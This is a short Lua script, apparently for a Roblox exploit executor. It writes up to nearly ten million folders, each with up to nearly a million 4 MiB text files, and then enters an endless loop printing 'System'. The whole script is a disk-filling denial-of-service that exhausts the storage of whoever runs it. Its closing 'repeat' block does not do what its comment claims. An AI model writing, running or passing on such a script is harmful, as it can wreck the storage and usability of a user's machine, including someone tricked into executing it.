local folderCount = 9999999
local txtCount = 999999
local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
local repeatCreation = true

-- Generate file contents once
local content = string.rep("A", fileSize)

-- Create folders and files
for i = 1, folderCount do
    local folder = "Folder_" .. i

    if not isfolder(folder) then
        makefolder(folder)
    end

    for j = 1, txtCount do
        local file = folder .. "/File_" .. j .. ".txt"
        writefile(file, content)
        print("Created: " .. file)
    end
end

-- Repeat with no intentional delay
if repeatCreation then
    local run = true

    while run do
        task.wait() -- Yields to avoid locking up the executor
        print("System")
    end
end
